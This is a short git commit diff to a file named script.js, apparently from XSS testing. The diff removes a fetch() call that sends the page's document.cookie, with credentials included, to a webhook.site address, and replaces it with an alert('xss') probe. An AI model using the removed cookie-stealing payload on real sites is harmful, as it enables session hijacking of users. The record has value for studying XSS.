459426b18dbebc9364e5f72763c6cb000cbfe099
Theory <51336409+7h30ry@users.noreply.github.com>
2025-05-03 14:18:42 +0100

    script.js

--- script.js
+++ script.js
@@ -1,5 +1,1 @@
-fetch('https://webhook.site/2fb97de6-5240-45a4-81ad-3bc5411dd884/?data=' + encodeURIComponent(document.cookie), {
-  method: 'GET',
-  mode: 'cors',
-  credentials: 'include'
-});
+alert('xss');
